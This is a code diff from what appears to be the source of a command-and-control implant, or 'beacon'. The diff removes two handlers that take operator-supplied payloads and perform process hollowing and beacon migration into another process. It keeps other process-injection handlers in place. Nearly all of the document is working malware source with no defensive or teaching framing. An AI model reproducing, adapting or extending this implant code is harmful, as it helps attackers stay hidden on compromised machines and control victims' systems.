@@ -566,7 +566,7 @@ bool handleExit(const uint8_t* args, size_t args_len) {
 }
 
 /* ============================================================================
- * Process Injection / Hollowing / Migration Handlers
+ * Process Injection Handlers
  * ============================================================================ */
 
 #include "../include/injection.h"
@@ -619,137 +619,6 @@ bool handleInjectProcess(const uint8_t* args, size_t args_len) {
     }
 
     return false;  // Don't break main loop
-}
-// could be a BOF. TODO
-bool handleHollowProcess(const uint8_t* args, size_t args_len) {
-    /*
-     * Payload format:
-     *   target_path_len (2 bytes, uint16_t, wchar_t count)
-     *   target_path (target_path_len * 2 bytes, UTF-16LE)
-     *   payload_size (4 bytes, uint32_t)
-     *   payload_data (payload_size bytes, PE in memory format)
-     */
-    if (args_len < 6) {
-        g_debugPrint("[HOLLOW] Payload too small");
-        return false;
-    }
-
-    uint16_t path_len = readLE16(args);
-    if (path_len == 0 || path_len > MAX_PATH_LEN_INJECT) {
-        g_debugPrint("[HOLLOW] Invalid path length: %u", path_len);
-        return false;
-    }
-
-    if (args_len < 6 + path_len * sizeof(wchar_t)) {
-        g_debugPrint("[HOLLOW] Path length mismatch");
-        return false;
-    }
-
-    const wchar_t* target_path = (const wchar_t*)(args + 2);
-    uint32_t payload_size = readLE32(args + 2 + path_len * sizeof(wchar_t));
-
-    if (payload_size == 0 || payload_size > MAX_HOLLOWING_PAYLOAD) {
-        g_debugPrint("[HOLLOW] Invalid payload size: %u", (unsigned)payload_size);
-        return false;
-    }
-
-    size_t headerOffset = 6 + path_len * sizeof(wchar_t);
-    if (args_len < headerOffset + payload_size) {
-        g_debugPrint("[HOLLOW] Payload length mismatch: have %zu, need %zu",
-                     args_len, headerOffset + payload_size);
-        return false;
-    }
-
-    const uint8_t* payload_data = args + headerOffset;
-
-    g_debugPrint("[HOLLOW] Hollowing %ls with %u byte payload", target_path, (unsigned)payload_size);
-
-    functionTable* nt = getfuncTable();
-    if (!nt) {
-        g_debugPrint("[HOLLOW] functionTable not available");
-        return false;
-    }
-
-    HANDLE hProcess = nullptr;
-    HANDLE hThread = nullptr;
-
-    BOOL ok = ProcessHollow(nt, target_path, payload_data, payload_size, &hProcess, &hThread);
-
-    if (hThread) nt->NtClose(hThread);
-    if (hProcess) nt->NtClose(hProcess);
-
-    if (ok) {
-        g_debugPrint("[HOLLOW] Process hollowing successful");
-    } else {
-        g_debugPrint("[HOLLOW] Process hollowing failed");
-    }
-
-    return false;
-}
-
-// could be a BOF. TODO
-bool handleMigrate(const uint8_t* args, size_t args_len) {
-    /*
-     * Payload format:
-     *   target_path_len (2 bytes, uint16_t, wchar_t count)
-     *   target_path (target_path_len * 2 bytes, UTF-16LE)
-     *   beacon_payload_size (4 bytes, uint32_t)
-     *   beacon_payload_data (beacon_payload_size bytes, PE in memory format)
-     *
-     * The beacon payload should be a self-contained beacon DLL/EXE
-     * that will check in with the server after being hollowed into the target.
-     */
-    if (args_len < 6) {
-        g_debugPrint("[MIGRATE] Payload too small");
-        return false;
-    }
-
-    uint16_t path_len = readLE16(args);
-    if (path_len == 0 || path_len > MAX_PATH_LEN_INJECT) {
-        g_debugPrint("[MIGRATE] Invalid path length: %u", path_len);
-        return false;
-    }
-
-    if (args_len < 6 + path_len * sizeof(wchar_t)) {
-        g_debugPrint("[MIGRATE] Path length mismatch");
-        return false;
-    }
-
-    const wchar_t* target_path = (const wchar_t*)(args + 2);
-    uint32_t beacon_payload_size = readLE32(args + 2 + path_len * sizeof(wchar_t));
-
-    if (beacon_payload_size == 0 || beacon_payload_size > MAX_HOLLOWING_PAYLOAD) {
-        g_debugPrint("[MIGRATE] Invalid beacon payload size: %u", (unsigned)beacon_payload_size);
-        return false;
-    }
-
-    size_t headerOffset = 6 + path_len * sizeof(wchar_t);
-    if (args_len < headerOffset + beacon_payload_size) {
-        g_debugPrint("[MIGRATE] Beacon payload length mismatch");
-        return false;
-    }
-
-    const uint8_t* beacon_payload_data = args + headerOffset;
-
-    g_debugPrint("[MIGRATE] Migrating to %ls with %u byte beacon", target_path, (unsigned)beacon_payload_size);
-
-    functionTable* nt = getfuncTable();
-    BOOL ok = MigrateBeacon(nt, target_path, beacon_payload_data, beacon_payload_size);
-
-    if (ok) {
-        g_debugPrint("[MIGRATE] Migration initiated successfully");
-    } else {
-        g_debugPrint("[MIGRATE] Migration failed");
-    }
-
-    // After migration, the old beacon should exit. Signal by returning true
-    // to break the main loop. The new beacon will check in independently.
-    if (ok) {
-        g_debugPrint("[MIGRATE] Old beacon will now exit");
-        return true;  // Break main loop
-    }
-
-    return false;
 }
 
 /* ============================================================================
